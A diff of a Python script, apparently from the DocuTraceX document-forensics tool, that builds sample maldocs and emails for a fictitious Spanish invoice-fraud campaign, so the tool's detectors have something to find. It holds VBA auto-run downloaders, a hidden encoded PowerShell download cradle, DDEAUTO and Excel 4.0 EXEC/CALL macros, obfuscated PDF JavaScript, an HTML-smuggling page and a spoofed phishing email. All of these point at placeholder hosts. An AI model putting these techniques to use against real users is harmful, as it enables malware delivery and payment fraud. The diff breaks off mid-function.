@@ -1,451 +1,505 @@
 #!/usr/bin/env python3
-"""Generate benign sample files, one per in-scope type, under ``samples/``.
+"""Generate realistic, benign sample files — one per in-scope type — under ``samples/``.
 
-The OOXML samples (Word/Excel/PowerPoint) carry realistic *benign* content that
-exercises the parsers and produces findings and IOCs:
-- document metadata (docProps)
-- reconstructable text with benign IOCs (RFC 5737 TEST-NET IPs, example.* URLs)
-- macro-enabled variants include a VBA project and (Word) a DDEAUTO field
-- template variants include an external relationship
-- Excel includes a hidden sheet and a WEBSERVICE formula
+All samples tell one (fictitious) story: an invoice-fraud campaign that
+impersonates a supplier, *Suministros Iberia S.L.*, against the finance team of
+*Grupo Ejemplo*. Each file is a structurally real document of its type carrying
+the techniques real maldocs use, so every DocuTraceX module has something to
+find:
 
-The legacy OLE/CFB files, XLSB, PDF, EML/EMLX/MSG remain minimal valid files of
-their type (their parsers come later). Everything is benign — the "malicious"
-strings are documentation examples, not real payloads.
+- Word: VBA downloader (AutoOpen, URLDownloadToFile, WScript.Shell, Base64
+  PowerShell in a document variable), DDEAUTO, remote template injection,
+  INCLUDEPICTURE tracking, custom properties, rsids, a global-template macro.
+- Excel: invoice sheets, WEBSERVICE/FILTERXML, hidden + very-hidden sheets, an
+  Excel 4.0 macro sheet with Auto_Open (EXEC/CALL/URLDownloadToFile), VBA
+  Workbook_Open; legacy BIFF8 with a very-hidden macro sheet.
+- PowerPoint: slides with links, the mouse-over ``ppaction://program`` trick,
+  VBA in macro-enabled variants.
+- Legacy .doc/.dot: real CFB with VBA, SummaryInformation and an ObjectPool
+  holding an Equation Editor object / an OLE Package.
+- RTF: Equation Editor, OLE2Link + ``\\objupdate``, a Package, remote template,
+  INCLUDEPICTURE, obfuscated ``\\objdata``.
+- PDF: invoice lure with OpenAction JavaScript (obfuscated: eval/unescape),
+  a Launch action, a link and a QR code to the phishing page, a submit form and
+  the macro document embedded.
+- Email (.eml/.emlx/.msg): spoofed supplier with SPF/DMARC fail, two Received
+  hops, PHPMailer, a DKIM signature broken by a later edit of the amount, Safe
+  Links + Proofpoint wrapped look-alike link, tracking pixel, and attachments:
+  the .docm, the RTF disguised as .doc, a double-extension "PDF", a QR image and
+  an HTML-smuggling page.
+
+Every host, address and payload is an inert documentation value: ``*.example``
+domains (RFC 2606), TEST-NET IPs (RFC 5737), placeholder binaries ("MZ" + text).
+Nothing here is executable malware.
+
+``sample.xlsb`` is oletools' benign Excel 4.0 test file (BSD-2-Clause, see
+samples/README.md): pyxlsb2 can read XLSB but nothing can write it.
 
 Run:  python scripts/make_samples.py
 """
 
 from __future__ import annotations
 
+import base64
+import shutil
 import struct
-import zipfile
-from email.message import EmailMessage
-from email.utils import formatdate
+import sys
 from pathlib import Path
 
-SAMPLES = Path(__file__).resolve().parent.parent / "samples"
+sys.path.insert(0, str(Path(__file__).resolve().parent))
 
-# Benign documentation IOCs (RFC 5737 / RFC 2606 / example.*).
-URL_A = "http://malware.example.com/payload.bin"
-URL_FEED = "http://feeds.example.net/data"
-IP_A = "203.0.113.10"
-EXT_TEMPLATE = "http://templates.example.org/corp.dotm"
+import mailkit as mk  # noqa: E402
+import officekit as ok  # noqa: E402
+import pdfkit as pk  # noqa: E402
+import rtfkit as rk  # noqa: E402
+from cfb import build_cfb  # noqa: E402
+from ovba import Module, vba_storage  # noqa: E402
 
-REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
-PKGREL = "http://schemas.openxmlformats.org/package/2006/relationships"
+ROOT = Path(__file__).resolve().parent.parent
+SAMPLES = ROOT / "samples"
 
-MACRO_EXTS = {".docm", ".dotm", ".xlsm", ".xltm", ".xlam", ".pptm", ".potm",
-              ".ppsm", ".ppam", ".sldm"}
-TEMPLATE_EXTS = {".dotx", ".dotm", ".xltx", ".xltm", ".potx", ".potm"}
+# --- the campaign (all inert documentation values) ------------------------------------
+SUPPLIER = "Suministros Iberia S.L."
+SUPPLIER_DOMAIN = "suministros-iberia.example.com"
+VICTIM_DOMAIN = "grupoejemplo.example"
+PAYLOAD_URL = "http://cdn-update.example.net/files/upd.bin"
+STAGE2_URL = "http://198.51.100.23/a.ps1"
+TEMPLATE_URL = "http://198.51.100.23/plantillas/Normal.dotm"
+PIXEL_URL = "http://cdn-update.example.net/px/logo.png"
+PHISH_URL = "https://login.rnicrosoft-online.example/owa/?id=fin-0187"
+PORTAL_URL = f"https://{SUPPLIER_DOMAIN}/portal/factura/2026-0187"
+C2_IP = "203.0.113.47"
+INVOICE = "2026-0187"
+AMOUNT = "1.250,00"
 
-# ext -> (family, main_part, main_content_type)
-OOXML_MAIN: dict[str, tuple[str, str, str]] = {
-    ".docx": ("word", "word/document.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"),
-    ".docm": ("word", "word/document.xml", "application/vnd.ms-word.document.macroEnabled.main+xml"),
-    ".dotx": ("word", "word/document.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml"),
-    ".dotm": ("word", "word/document.xml", "application/vnd.ms-word.template.macroEnabledTemplate.main+xml"),
-    ".xlsx": ("excel", "xl/workbook.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"),
-    ".xlsm": ("excel", "xl/workbook.xml", "application/vnd.ms-excel.sheet.macroEnabled.main+xml"),
-    ".xltx": ("excel", "xl/workbook.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml"),
-    ".xltm": ("excel", "xl/workbook.xml", "application/vnd.ms-excel.template.macroEnabled.main+xml"),
-    ".xlam": ("excel", "xl/workbook.xml", "application/vnd.ms-excel.addin.macroEnabled.main+xml"),
-    ".pptx": ("powerpoint", "ppt/presentation.xml", "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"),
-    ".pptm": ("powerpoint", "ppt/presentation.xml", "application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml"),
-    ".potx": ("powerpoint", "ppt/presentation.xml", "application/vnd.openxmlformats-officedocument.presentationml.template.main+xml"),
-    ".potm": ("powerpoint", "ppt/presentation.xml", "application/vnd.ms-powerpoint.template.macroEnabled.main+xml"),
-    ".ppsx": ("powerpoint", "ppt/presentation.xml", "application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml"),
-    ".ppsm": ("powerpoint", "ppt/presentation.xml", "application/vnd.ms-powerpoint.slideshow.macroEnabled.main+xml"),
-    ".ppam": ("powerpoint", "ppt/presentation.xml", "application/vnd.ms-powerpoint.addin.macroEnabled.main+xml"),
-    ".sldx": ("powerpoint", "ppt/presentation.xml", "application/vnd.openxmlformats-officedocument.presentationml.slide.main+xml"),
-    ".sldm": ("powerpoint", "ppt/presentation.xml", "application/vnd.ms-powerpoint.slide.macroEnabled.main+xml"),
-    ".xlsb": ("xlsb", "xl/workbook.bin", "application/vnd.ms-excel.sheet.binary.macroEnabled.main"),
+PS_STAGE = f"IEX (New-Object Net.WebClient).DownloadString('{STAGE2_URL}')"
+PS_B64 = base64.b64encode(PS_STAGE.encode("utf-16-le")).decode()
+MZ_STUB = b"MZ\x90\x00" + b"\x00" * 60 + b"This is an inert DocuTraceX sample, not a program.\r\n"
+
+# --- VBA ------------------------------------------------------------------------------
+VBA_DOWNLOADER = f'''Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" _
+    (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
+     ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
+
+Sub AutoOpen()
+    ActualizarFactura
+End Sub
+
+Sub Document_Open()
+    ActualizarFactura
+End Sub
+
+Private Function D(s As String) As String
+    Dim i As Integer, r As String
+    For i = 1 To Len(s) Step 2
+        r = r & Chr(CLng("&H" & Mid(s, i, 2)))
+    Next i
+    D = r
+End Function
+
+Sub ActualizarFactura()
+    Dim u As String, p As String, sh As Object
+    u = "ht" & "tp://cdn-update.example.net" & D("2f66696c65732f7570642e62696e")
+    p = Environ("TEMP") & "\\upd.exe"
+    URLDownloadToFileA 0, u, p, 0, 0
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "powershell -nop -w hidden -enc " & ActiveDocument.Variables("cfg").Value, 0, False
+    sh.Run p, 0, False
+End Sub
+'''
+
+VBA_TEMPLATE = '''Sub AutoExec()
+    ' Global template: runs every time Word starts
+    Dim f As String
+    f = Environ("APPDATA") & "\\Microsoft\\Word\\STARTUP\\sync.dotm"
+    If Dir(f) = "" Then FileCopy ActiveDocument.FullName, f
+End Sub
+
+Sub AutoNew()
+    Shell "cmd /c start /min powershell -w hidden -c ""iwr http://cdn-update.example.net/n -o $env:TEMP\\n.exe""", 0
+End Sub
+'''
+
+VBA_WORKBOOK = '''Private Sub Workbook_Open()
+    Dim x As Object
+    Set x = CreateObject("MSXML2.XMLHTTP")
+    x.Open "GET", "http://cdn-update.example.net/files/upd.bin", False
+    x.Send
+    Dim s As Object
+    Set s = CreateObject("ADODB.Stream")
+    s.Type = 1: s.Open: s.Write x.responseBody
+    s.SaveToFile Environ("TEMP") & "\\upd.exe", 2
+    Shell Environ("TEMP") & "\\upd.exe", vbHide
+End Sub
+'''
+
+VBA_PPT = '''Sub Auto_Open()
+    Dim o As Object
+    Set o = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process")
+    o.Create "mshta http://cdn-update.example.net/p.hta", Null, Null, 0
+End Sub
+'''
+
+# --- Word -----------------------------------------------------------------------------
+W_DOC = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"
+W_DOCM = "application/vnd.ms-word.document.macroEnabled.main+xml"
+W_DOTX = "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml"
+W_DOTM = "application/vnd.ms-word.template.macroEnabledTemplate.main+xml"
+
+INVOICE_TEXT = [
+    f"{SUPPLIER} — Departamento de Administración",
+    "Calle de la Industria 42, 28045 Madrid · CIF B-00000000",
+    f"FACTURA Nº {INVOICE}",
+    "Cliente: Grupo Ejemplo S.A. — Dpto. Financiero",
+    f"Concepto: suministro de material de oficina (pedido PO-2026-0412). Importe total: {AMOUNT} EUR (IVA incl.).",
+    "Este documento ha sido protegido. Para ver el contenido, pulse «Habilitar edición» y después «Habilitar contenido».",
+    f"Si no puede visualizarlo, descárguelo desde {PORTAL_URL} o contacte con soporte ({C2_IP}).",
+]
+
+
+def _core(title: str, creator: str, last_by: str, created: str, modified: str, rev: int = 4) -> str:
+    return ok.core_xml(title, creator, last_by, created, modified, rev)
+
+
+def word_docm() -> bytes:
+    """Factura_2026-0187.docm: VBA downloader + DDEAUTO + doc variable payload."""
+    return ok.docm(
+        INVOICE_TEXT, [Module("NewMacros", VBA_DOWNLOADER)],
+        fields=['DDEAUTO c:\\\\Windows\\\\System32\\\\cmd.exe "/k powershell -w hidden -c iwr '
+                f'{PAYLOAD_URL} -o %TEMP%\\\\upd.exe"'],
+        doc_vars={"cfg": PS_B64},
+        custom={"Departamento": "Facturación", "Referencia": f"FAC-{INVOICE}"},
+        core=_core(f"Factura {INVOICE}", "Administracion", "jmartin", "2026-10-08T07:12:00Z",
+                   "2026-10-13T16:48:00Z", 7),
+        app=ok.app_xml("Microsoft Office Word", SUPPLIER, "Normal.dotm", pages=1, total_time=42),
+        rsids=["00A1B2C3", "00D4E5F6", "0047AA19"])
+
+
+def word_docx() -> bytes:
+    """Propuesta comercial with a remote template (template injection) and a tracking image."""
+    return ok.docm(
+        ["Propuesta comercial 2027 — Grupo Ejemplo",
+         "Adjuntamos las condiciones revisadas para el próximo ejercicio.",
+         "El documento se completa automáticamente al abrirlo; espere unos segundos."],
+        fields=[f'INCLUDEPICTURE "{PIXEL_URL}" \\d'],
+        remote_template=TEMPLATE_URL,
+        core=_core("Propuesta comercial 2027", "María López", "Administrador", "2026-09-30T10:00:00Z",
+                   "2026-10-12T08:31:00Z"),
+        app=ok.app_xml("Microsoft Office Word", SUPPLIER), rsids=["00B1C2D3", "0047AA19"], macro=False)
+
+
+def word_dotx() -> bytes:
+    return ok.retype(ok.docm(
+        ["Plantilla corporativa — Comunicaciones a proveedores", "[Nombre del proveedor]", "[Cuerpo del mensaje]"],
+        fields=[f'INCLUDEPICTURE "{PIXEL_URL}" \\d'],
+        custom={"Plantilla": "Proveedores v3", "Propietario": "Compras"},
+        core=_core("Plantilla proveedores", "Compras", "Compras", "2026-06-01T09:00:00Z", "2026-10-01T09:00:00Z"),
+        app=ok.app_xml("Microsoft Office Word", "Grupo Ejemplo S.A."), macro=False), W_DOC, W_DOTX)
+
+
+def word_dotm() -> bytes:
+    return ok.retype(ok.docm(
+        ["Plantilla global de facturación", "No elimine este archivo: lo usa la macro de numeración."],
+        [Module("AutoMacros", VBA_TEMPLATE)], remote_template=TEMPLATE_URL,
+        core=_core("Facturacion", "Administracion", "jmartin", "2026-09-01T09:00:00Z", "2026-10-13T16:50:00Z"),
+        app=ok.app_xml("Microsoft Office Word", SUPPLIER)), W_DOCM, W_DOTM)
+
+
+# --- Excel ----------------------------------------------------------------------------
+X_CT = {
+    ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
+    ".xlsm": "application/vnd.ms-excel.sheet.macroEnabled.main+xml",
+    ".xltx": "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml",
+    ".xltm": "application/vnd.ms-excel.template.macroEnabled.main+xml",
+    ".xlam": "application/vnd.ms-excel.addin.macroEnabled.main+xml",
 }
 
-OLE_EXTS = [".doc", ".dot", ".xls", ".xlt", ".xla", ".ppt", ".pot", ".msg"]
-
-W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
-X_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
-P_NS = "http://schemas.openxmlformats.org/presentationml/2006/main"
-A_NS = "http://schemas.openxmlformats.org/drawingml/2006/main"
-
-CORE_XML = (
-    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-    '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"'
-    ' xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/"'
-    ' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
-    '<dc:title>DocuTraceX benign sample</dc:title>'
-    '<dc:creator>gmzpt</dc:creator>'
-    '<cp:lastModifiedBy>analyst</cp:lastModifiedBy>'
-    '<dcterms:created xsi:type="dcterms:W3CDTF">2026-10-14T00:00:00Z</dcterms:created>'
-    '<dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-14T00:00:00Z</dcterms:modified>'
-    "</cp:coreProperties>"
-)
-
-
-def _app_xml(app_name: str) -> str:
-    return (
-        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-        '<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">'
-        f"<Application>{app_name}</Application><Company>DocuTraceX Test</Company>"
-        "<AppVersion>16.0000</AppVersion></Properties>"
-    )
+INVOICE_ROWS = [
+    [f"{SUPPLIER}", None, None, f"Factura {INVOICE}"],
+    ["Fecha", "13/10/2026", None, "Vencimiento: 20/10/2026"],
+    [],
+    ["Referencia", "Descripción", "Unidades", "Importe (EUR)"],
+    ["MO-1120", "Papel A4 80 g (caja 5 paquetes)", 40, 380.0],
+    ["MO-2210", "Tóner compatible HP 26A", 6, 498.0],
+    ["MO-3305", "Archivadores A-Z lomo ancho", 60, 155.0],
+    [None, None, "Base imponible", "=SUM(D5:D7)"],
+    [None, None, "IVA 21%", "=D8*0.21"],
+    [None, None, "TOTAL", "=D8+D9"],
+    [],
+    ["Estado del pago", f'=WEBSERVICE("https://{SUPPLIER_DOMAIN}/api/estado?f={INVOICE}")'],
+    ["Cuenta de abono", '=FILTERXML(WEBSERVICE("http://cdn-update.example.net/iban.xml"),"//iban")'],
+]
+DATA_ROWS = [["IBAN anterior", "ES00 0000 0000 0000 0000 0000"],
+             ["IBAN nuevo (desde 10/2026)", "ES99 9999 9999 9999 9999 9999"],
+             ["Contacto", "pagos.suministros@mail-box.example.org"]]
+XLM_ROWS = [
+    ['=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://cdn-update.example.net/files/upd.bin",'
+     '"C:\\Users\\Public\\upd.dll",0,0)'],
+    ['=EXEC("rundll32.exe C:\\Users\\Public\\upd.dll,DllRegisterServer")'],
+    ['=ALERT("El documento no es compatible con su versión de Excel.",2)'],
+    ["=HALT()"],
+]
 
 
-def _content_types(family: str, main_part: str, main_ct: str) -> str:
-    extra = ""
-    if family == "excel":
-        extra = ('<Override PartName="/xl/worksheets/sheet1.xml" '
-                 'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>')
-    elif family == "powerpoint":
-        extra = ('<Override PartName="/ppt/slides/slide1.xml" '
-                 'ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>')
-    return (
-        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
-        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
-        '<Default Extension="xml" ContentType="application/xml"/>'
-        '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
-        f'<Override PartName="/{main_part}" ContentType="{main_ct}"/>'
-        '<Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>'
-        '<Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>'
-        f"{extra}"
-        "</Types>"
-    )
+def excel(ext: str) -> bytes:
+    macro = ext in (".xlsm", ".xltm", ".xlam")
+    sheets = [("Factura", "visible", INVOICE_ROWS), ("Datos", "hidden", DATA_ROWS)]
+    return ok.xlsx(
+        sheets, main_ct=X_CT[ext],
+        macro_sheets=[("Macro1", "veryHidden", XLM_ROWS)] if macro else None,
+        defined_names={"_xlnm.Auto_Open": "Macro1!$A$1"} if macro else None,
+        modules=[Module("ThisWorkbook", VBA_WORKBOOK, document=True)] if macro else None,
+        core=_core(f"Factura {INVOICE}", "Contabilidad", "jmartin", "2026-10-07T11:02:00Z", "2026-10-13T16:40:00Z"),
+        app=ok.app_xml("Microsoft Excel", SUPPLIER),
+        custom={"Referencia": f"FAC-{INVOICE}"})
 
 
-def _root_rels(main_part: str, external_template: bool) -> str:
-    rels = [
-        f'<Relationship Id="rId1" Type="{REL}/officeDocument" Target="{main_part}"/>',
-        f'<Relationship Id="rId2" Type="{REL}/metadata/core-properties" Target="docProps/core.xml"/>',
-        f'<Relationship Id="rId3" Type="{REL}/extended-properties" Target="docProps/app.xml"/>',
+# --- PowerPoint -----------------------------------------------------------------------
+P_CT = {
+    ".pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
+    ".pptm": "application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml",
+    ".potx": "application/vnd.openxmlformats-officedocument.presentationml.template.main+xml",
+    ".potm": "application/vnd.ms-powerpoint.template.macroEnabled.main+xml",
+    ".ppsx": "application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml",
+    ".ppsm": "application/vnd.ms-powerpoint.slideshow.macroEnabled.main+xml",
+    ".ppam": "application/vnd.ms-powerpoint.addin.macroEnabled.main+xml",
+    ".sldx": "application/vnd.openxmlformats-officedocument.presentationml.slide.main+xml",
+    ".sldm": "application/vnd.ms-powerpoint.slide.macroEnabled.main+xml",
+}
+
+
+def powerpoint(ext: str) -> bytes:
+    macro = ext.endswith("m")
+    slides = [
+        {"title": "Nuevo procedimiento de pago a proveedores",
+         "lines": [f"A partir del 15/10/2026 {SUPPLIER} cambia su cuenta de abono.",
+                   "Actualice los datos bancarios en el portal antes del cierre mensual."],
+         "link": (PHISH_URL, "Acceder al portal de proveedores")},
+        {"title": "Calendario de cierre", "lines": ["Semana 42: conciliación", "Semana 43: pagos"]},
     ]
-    if external_template:
-        rels.append(
-            f'<Relationship Id="rId9" Type="{REL}/attachedTemplate" '
-            f'Target="{EXT_TEMPLATE}" TargetMode="External"/>'
-        )
-    return (
-        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
-        f'<Relationships xmlns="{PKGREL}">{"".join(rels)}</Relationships>'
-    )
+    if ext in (".ppsx", ".ppsm"):
+        # The 2017 mouse-over technique: moving the pointer over the text runs a program.
+        slides[1]["mouseover_program"] = ("powershell -nop -w hidden -c \"iwr " + PAYLOAD_URL +
+                                          " -o $env:TEMP\\upd.exe; start $env:TEMP\\upd.exe\"")
+    return ok.pptx(slides, main_ct=P_CT[ext], modules=[Module("Module1", VBA_PPT)] if macro else None,
+                   core=_core("Procedimiento de pagos", "Tesorería", "jmartin", "2026-10-05T08:00:00Z",
+                              "2026-10-13T17:05:00Z"),
+                   app=ok.app_xml("Microsoft Office PowerPoint", SUPPLIER))
 
 
-def _word_doc(macro: bool) -> str:
-    body = [
-        f'<w:p><w:r><w:t>Confidential quarterly report. See {URL_A} and host {IP_A} for details.</w:t></w:r></w:p>'
+# --- legacy OLE -----------------------------------------------------------------------
+
+def _biff_rec(rtype: int, data: bytes) -> bytes:
+    return struct.pack("<HH", rtype, len(data)) + data
+
+
+def _biff8_workbook() -> bytes:
+    """A small BIFF8 Workbook stream: a visible sheet and a very-hidden Excel 4.0
+    macro sheet (what plugin_biff/XLMMacroDeobfuscator look for)."""
+    def bof(dt: int) -> bytes:
+        return _biff_rec(0x0809, struct.pack("<HHHHII", 0x0600, dt, 0x0DBB, 0x07CC, 0, 0x06))
+
+    def boundsheet(pos: int, state: int, kind: int, name: str) -> bytes:
+        nm = name.encode("latin-1")
+        return _biff_rec(0x0085, struct.pack("<IBBBB", pos, state, kind, len(nm), 0) + nm)
+
+    def label(row: int, col: int, text: str) -> bytes:
+        t = text.encode("latin-1")
+        return _biff_rec(0x0204, struct.pack("<HHHH", row, col, 15, len(t)) + b"\x00" + t)
+
+    sheets = [("Factura", 0, 0, [label(0, 0, f"Factura {INVOICE}"), label(1, 0, f"Importe: {AMOUNT} EUR")]),
+              ("Macro1", 2, 1, [label(0, 0, "=EXEC(\"cmd /c start http://cdn-update.example.net/x\")")])]
+    globals_ = [bof(0x0005), _biff_rec(0x0042, struct.pack("<H", 1252))]
+    head_len = sum(len(r) for r in globals_)
+    bs_len = sum(len(boundsheet(0, 0, 0, n)) for n, *_ in sheets)
+    eof = _biff_rec(0x000A, b"")
+    pos = head_len + bs_len + len(eof)
+    bodies, bss = [], []
+    for name, state, kind, recs in sheets:
+        body = bof(0x0040 if kind == 1 else 0x0010) + b"".join(recs) + eof
+        bss.append(boundsheet(pos, state, kind, name))
+        bodies.append(body)
+        pos += len(body)
+    return b"".join(globals_) + b"".join(bss) + eof + b"".join(bodies)
+
+
+def _ppt_stream() -> bytes:
+    text = "Nuevo procedimiento de pago a proveedores".encode("utf-16-le")
+    atom = struct.pack("<HHI", 0, 0x0FA0, len(text)) + text  # TextCharsAtom
+    return struct.pack("<HHI", 0x000F, 0x03E8, len(atom)) + atom  # DocumentContainer
+
+
+def legacy(ext: str) -> bytes:
+    summary = ok.summary_information(
+        "Administracion", "jmartin", "Normal.dotm" if ext in (".doc", ".dot") else "",
+        title=f"Factura {INVOICE}",
+        app={".doc": "Microsoft Office Word", ".dot": "Microsoft Office Word", ".xls": "Microsoft Excel",
+             ".xlt": "Microsoft Excel", ".xla": "Microsoft Excel"}.get(ext, "Microsoft Office PowerPoint"))
+    text = "\r".join(INVOICE_TEXT)
+    if ext == ".doc":
+        return ok.doc_legacy(text, [Module("NewMacros", VBA_DOWNLOADER)],
+                             objects={"_1823459012": ok.equation_object()}, summary=summary)
+    if ext == ".dot":
+        return ok.doc_legacy("Plantilla global de facturación", [Module("AutoMacros", VBA_TEMPLATE)],
+                             objects={"_1823459013": ok.package_object("Factura.pdf.vbs",
+                                                                     b'MsgBox "DocuTraceX sample"')},
+                             summary=summary)
+    if ext in (".xls", ".xlt", ".xla"):
+        return build_cfb({"Workbook": _biff8_workbook(), "\x05SummaryInformation": summary,
+                          "_VBA_PROJECT_CUR": vba_storage([Module("ThisWorkbook", VBA_WORKBOOK, document=True)])})
+    # Data appended after the compound file (ignored by PowerPoint; a hiding place for a payload).
+    return build_cfb({"PowerPoint Document": _ppt_stream(), "Current User": b"\x00" * 20,
+                      "\x05SummaryInformation": summary}) + MZ_STUB * 40
+
+
+# --- RTF ------------------------------------------------------------------------------
+
+def rtf_doc() -> bytes:
+    return rk.build_rtf(
+        INVOICE_TEXT[:5] + ["El detalle de la factura se muestra en el objeto incrustado. Si aparece un aviso, "
+                            "pulse «Sí» para actualizar los vínculos."],
+        title=f"Factura {INVOICE}", author="Administracion", operator="jmartin",
+        company=SUPPLIER, template=TEMPLATE_URL,
+        body_extra=[rk.equation(junk=" {\\*\\dtx} "), rk.ole2link(f"http://{C2_IP}/doc/factura.rtf"),
+                    rk.package("Factura.pdf.vbs", b'MsgBox "DocuTraceX sample"'),
+                    rk.field(f'INCLUDEPICTURE "{PIXEL_URL}" \\d', "logo"),
+                    rk.field(f'HYPERLINK "{PORTAL_URL}"', "Ver factura en el portal")])
+
+
+# --- PDF ------------------------------------------------------------------------------
+
+PDF_JS = ("var _0x=['\\x68\\x74\\x74\\x70','://login.rnicrosoft-online.example/owa/?id=fin-0187'];"
+          "eval(unescape('%61%70%70%2E%61%6C%65%72%74%28%27%45%6C%20%64%6F%63%75%6D%65%6E%74%6F%20%65%73%74"
+          "%61%20%70%72%6F%74%65%67%69%64%6F%27%29'));"
+          "this.exportDataObject({cName:'report.docm', nLaunch:2});"
+          "app.launchURL(_0x[0]+_0x[1], true);")
+
+
+def pdf_doc() -> bytes:
+    data, _root, _n = pk.lure_pdf(
+        [f"{SUPPLIER}", f"Factura {INVOICE} — Importe {AMOUNT} EUR", "",
+         "Documento protegido por Microsoft 365.",
+         "Para ver la factura, inicie sesión con su cuenta corporativa",
+         "o escanee el código QR con su móvil.", "",
+         "Si el documento no se abre, pulse «Abrir» en el aviso de seguridad."],
+        link=PHISH_URL, qr=PHISH_URL, open_js=PDF_JS, launch=("cmd.exe", "/c start report.docm"),
+        submit_url=f"http://{C2_IP}/collect.php", embedded=("report.docm", word_docm()),
+        title=f"Factura {INVOICE}", author="Administracion")
+    return data
+
+
+# --- email ----------------------------------------------------------------------------
+
+RECEIVED = [
+    f"from mx01.{VICTIM_DOMAIN} (mx01.{VICTIM_DOMAIN} [198.51.100.10]) by mbox.{VICTIM_DOMAIN} "
+    "with ESMTPS id 4Hq2kT0x9Lz; Tue, 13 Oct 2026 17:12:09 +0000",
+    f"from vps-2291.hosting.example (unknown [{C2_IP}]) by mx01.{VICTIM_DOMAIN} with ESMTP id 7Fg3; "
+    "Tue, 13 Oct 2026 17:12:04 +0000",
+]
+AUTH = (f"mx01.{VICTIM_DOMAIN}; spf=fail (sender IP is {C2_IP}) smtp.mailfrom=bounce.rnicrosoft-online.example; "
+        f"dkim=fail header.d={SUPPLIER_DOMAIN}; dmarc=fail action=none header.from={SUPPLIER_DOMAIN}")
+SUBJECT = f"Factura {INVOICE} pendiente de pago - URGENTE"
+FROM = f'"{SUPPLIER} | Administración" <facturacion@{SUPPLIER_DOMAIN}>'
+TO = f"Cuentas a pagar <cuentas.pagar@{VICTIM_DOMAIN}>"
+TEXT = (f"Estimados señores:\n\nLes recordamos que la factura {INVOICE} por importe de {AMOUNT} EUR vence hoy.\n"
+        "Hemos cambiado nuestra cuenta bancaria; encontrarán los nuevos datos en el portal de proveedores.\n\n"
+        f"Acceso: {PHISH_URL}\n\nUn saludo,\nDepartamento de Administración\n{SUPPLIER}\n")
+HTML = f"""<html><head><meta charset="utf-8"></head><body style="font-family:Calibri,Arial,sans-serif">
+<p>Estimados señores:</p>
+<p>Les recordamos que la <b>factura {INVOICE}</b> por importe de <b>{AMOUNT} EUR</b> vence <b>hoy</b>.</p>
+<p>Hemos cambiado nuestra cuenta bancaria. Consulten los nuevos datos en el portal de proveedores:</p>
+<p><a href="{mk.safelinks(mk.proofpoint_v3(PHISH_URL))}">{PORTAL_URL}</a></p>
+<p>También pueden escanear el código QR adjunto con su móvil.</p>
+<div style="display:none;font-size:0">invoice payment remittance confirmed safe sender</div>
+<p>Un saludo,<br>Departamento de Administración<br>{SUPPLIER}</p>
+<img src="http://cdn-update.example.net/o.gif?u=cuentas.pagar" width="1" height="1" alt="">
+</body></html>"""
+SMUGGLING_HTML = f"""<!doctype html><html><head><meta charset="utf-8"><title>Factura {INVOICE}</title></head>
+<body><p>Preparando su documento…</p>
+<script>
+var d = atob('{base64.b64encode(MZ_STUB).decode()}');
+var b = new Uint8Array(d.length); for (var i = 0; i < d.length; i++) b[i] = d.charCodeAt(i);
+var f = new Blob([b], {{type: 'application/octet-stream'}});
+var a = document.createElement('a'); a.href = URL.createObjectURL(f); a.download = 'Factura_{INVOICE}.zip';
+document.body.appendChild(a); a.click();
+setTimeout("location.href='{PHISH_URL}'", 3000);
+</script></body></html>"""
+
+
+def _attachments() -> list[tuple[str, str, bytes]]:
+    return [
+        ("report.docm", "application/vnd.ms-word.document.macroEnabled.12", word_docm()),
+        (f"Factura_{INVOICE}.pdf.exe", "application/octet-stream", MZ_STUB),
+        ("pedido.doc", "application/msword", rtf_doc()),
+        ("Factura.html", "text/html", SMUGGLING_HTML.encode()),
+        ("escanear.png", "image/png", mk.qr_png(PHISH_URL)),
     ]
-    if macro:
-        body.append(
-            '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
-            '<w:r><w:instrText> DDEAUTO c:\\\\Windows\\\\System32\\\\cmd.exe "/k calc.exe" </w:instrText></w:r>'
-            '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
-        )
-    return (
-        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
